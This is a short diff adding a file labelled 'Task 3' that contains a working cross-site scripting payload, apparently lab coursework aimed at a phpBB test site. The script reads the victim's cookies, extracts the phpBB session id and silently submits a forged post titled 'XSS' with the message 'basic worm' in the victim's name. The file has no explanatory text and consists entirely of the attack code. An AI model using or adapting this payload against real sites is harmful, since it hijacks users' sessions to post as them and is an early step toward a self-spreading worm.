@@ -1,0 +1,4 @@
+Task 3
+<script>
+var Ajax = null;Ajax = new XMLHttpRequest();Ajax.open("POST", "http://www.xsslabphpbb.com/posting.php", true);Ajax.setRequestHeader("Host", "www.xsslabphpbb.com");Ajax.setRequestHeader("Keep-Alive", "300");Ajax.setRequestHeader("Connection", "keep-alive");Ajax.setRequestHeader("Cookie", document.cookie);Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");var c = document.cookie || "";var c_arr = c.split('; '); var c_len = c_arr.length; var sid = "";for(var i=0; i<c_len; i++) {  if (unescape(c_arr[i].split('=')[0]) == 'phpbb2mysql_sid') {         sid = unescape(c_arr[i].split('=')[1]);         break;    }}var content="subject=" + "XSS" + "&addbbcode18=%23444444&addbbcode20=0&helpbox=Tip%3A+Styles+can+be+applied+quickly+to+selected+text.&message=basic+worm&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=" + sid + "&f=1&post=Submit";Ajax.send(content);
+</script>
